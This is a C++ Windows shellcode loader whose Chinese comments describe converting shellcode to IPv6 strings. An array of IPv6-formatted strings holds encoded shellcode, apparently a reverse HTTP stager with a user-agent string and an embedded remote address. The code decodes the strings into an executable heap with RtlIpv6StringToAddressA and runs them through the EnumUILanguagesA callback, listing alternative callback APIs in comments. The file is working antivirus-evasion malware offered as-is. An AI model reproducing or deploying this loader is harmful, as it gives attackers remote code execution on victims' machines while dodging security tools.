#include <Windows.h>
#include <iostream>
#include <ip2string.h>
#pragma comment(lib, "Ntdll.lib")


//（shellcode-> ipv6）
const char* ipv6[] =
{
    "fc48:83e4:f0e8:c800:0:4151:4150:5251", "5648:31d2:6548:8b52:6048:8b52:1848:8b52", "2048:8b72:5048:fb7:4a4a:4d31:c948:31c0", "ac3c:617c:22c:2041:c1c9:d41:1c1:e2ed", "5241:5148:8b52:208b:423c:4801:d066:8178", "180b:275:728b:8088:0:48:85c0:7467", "4801:d050:8b48:1844:8b40:2049:1d0:e356", "48ff:c941:8b34:8848:1d6:4d31:c948:31c0", "ac41:c1c9:d41:1c1:38e0:75f1:4c03:4c24", "845:39d1:75d8:5844:8b40:2449:1d0:6641", "8b0c:4844:8b40:1c49:1d0:418b:488:4801", "d041:5841:585e:595a:4158:4159:415a:4883", "ec20:4152:ffe0:5841:595a:488b:12e9:4fff", "ffff:5d6a:49:be77:696e:696e:6574:41", "5649:89e6:4c89:f141:ba4c:7726:7ff:d548", "31c9:4831:d24d:31c0:4d31:c941:5041:5041", "ba3a:5679:a7ff:d5e9:9300:0:5a48:89c1", "41b8:bb01:0:4d31:c941:5141:516a:341", "5141:ba57:899f:c6ff:d5eb:795b:4889:c148", "31d2:4989:d84d:31c9:5268:32:c084:5252", "41ba:eb55:2e3b:ffd5:4889:c648:83c3:506a", "a5f:4889:f1ba:1f00:0:6a00:6880:3300", "49:89e0:41b9:400:0:41ba:7546:9e86", "ffd5:4889:f148:89da:49c7:c0ff:ffff:ff4d", "31c9:5252:41ba:2d06:187b:ffd5:85c0:f85", "9d01:0:48ff:cf0f:848c:100:eb:b3e9", "e401:0:e882:ffff:ff2f:6c7a:3641:f7", "6059:6d9c:7807:147f:903c:b5f2:d199:9d91", "c266:c46e:173f:b843:b3ee:4528:ef8f:ce7b", "5b06:912c:2ea4:2ae7:68de:b9f2:82de:ae9e", "91e7:f530:389f:6be4:405a:7bc:cf15:9199", "e05f:943e:a5:ffd:55:7365:722d:4167", "656e:743a:204d:6f7a:696c:6c61:2f35:2e30", "2028:636f:6d70:6174:6962:6c65:3b20:4d53", "4945:2031:302e:303b:2057:696e:646f:7773", "204e:5420:362e:323b:2057:696e:3634:3b20", "7836:343b:2054:7269:6465:6e74:2f36:2e30", "3b20:4d41:4152:4a53:290d:a00:71e4:fbc4", "3ac6:6a35:e94:d6d4:3678:f749:9d55:2695", "ac46:fb05:6af6:585c:9f31:8bee:432e:f9f0", "8c6a:486a:f0e8:8988:1532:176b:e558:1b7", "6cb0:96c4:7f49:5134:285e:b998:7c4d:ba1c", "e235:4525:71da:4b1f:7f67:b77d:9eb0:a87f", "bed:8a5c:12a9:625a:981:b7b9:10b3:8bdd", "98e9:6f62:1ea9:892f:fa9f:2666:16b1:3bd0", "b0c3:32b1:e00d:f9a3:4100:23d0:7171:c01a", "73f1:4004:3bae:5716:7c42:c48:3197:607a", "ac60:c5c7:8562:babc:effe:62a4:7d0e:7975", "4b47:b86d:4248:df4a:3364:d086:3b29:b19b", "dedc:9ab6:cc1c:36de:510c:4fa4:8385:85af", "7d23:1c56:db86:be91:41:bef0:b5a2:56ff", "d548:31c9:ba00:40:41:b800:1000:41", "b940:0:41:ba58:a453:e5ff:d548:9353", "5348:89e7:4889:f148:89da:41b8:20:0", "4989:f941:ba12:9689:e2ff:d548:83c4:2085", "c074:b666:8b07:4801:c385:c075:d758:5858", "4805::50c3:e87f:fdff:ff31:2e31", "352e:3830:2e31:3032:49:9602:d200:0"

};


int main()
{
    HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);//在进程的虚拟地址空间中保留空间
    void* ha = HeapAlloc(hc, 0, 0x100000);//申请内存
    DWORD_PTR hptr = (DWORD_PTR)ha;
    int elems = sizeof(ipv6) / sizeof(ipv6[0]);
    PCSTR Terminator = "";

    for (int i = 0; i < elems; i++) {

        if (RtlIpv6StringToAddressA(ipv6[i],  &Terminator, (in6_addr*)hptr) == STATUS_INVALID_PARAMETER)
        {
            printf("ERROR!");
            return 0;
        }
        hptr += 16;
    }

    // EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0);
    // EnumTimeFormatsA((TIMEFMT_ENUMPROCA)ha, 0, 0);
    // EnumWindows((WNDENUMPROC)ha, 0);
    // EnumDesktopWindows(NULL,(WNDENUMPROC)ha, 0);
    // EnumThreadWindows(0, (WNDENUMPROC)ha, 0);
    // EnumSystemGeoID(0, 0, (GEO_ENUMPROC)ha);
    // EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)ha, 0, 0);
    EnumUILanguagesA((UILANGUAGE_ENUMPROCA)ha, 0, 0);
    // EnumSystemCodePagesA((CODEPAGE_ENUMPROCA)ha, 0);
    // EnumDesktopsW(NULL,(DESKTOPENUMPROCW)ha, NULL);
    // EnumSystemCodePagesW((CODEPAGE_ENUMPROCW)ha, 0);
    // EnumDateFormatsA((DATEFMT_ENUMPROCA)ha, 0, 0);
    // EnumChildWindows(NULL, (WNDENUMPROC)ha, 0);
    // CloseHandle(ha);
    return 0;
}
